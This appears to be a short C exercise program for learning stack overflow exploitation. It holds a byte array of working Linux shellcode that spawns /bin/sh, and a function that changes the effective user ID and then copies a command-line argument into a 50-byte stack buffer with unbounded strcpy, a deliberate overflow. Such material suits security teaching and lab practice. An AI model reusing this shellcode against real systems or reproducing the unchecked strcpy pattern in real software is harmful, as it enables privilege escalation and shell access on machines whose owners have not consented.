#include<unistd.h>
#include<string.h>

char SHELLCODE[] = "\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

void func(unsigned char *str) {
  char buffer[50];
  seteuid(5);
  strcpy(buffer, str);
}

int main(int argc, char *argv[]) {
  if(argc > 0)
    func(argv[1]);
}
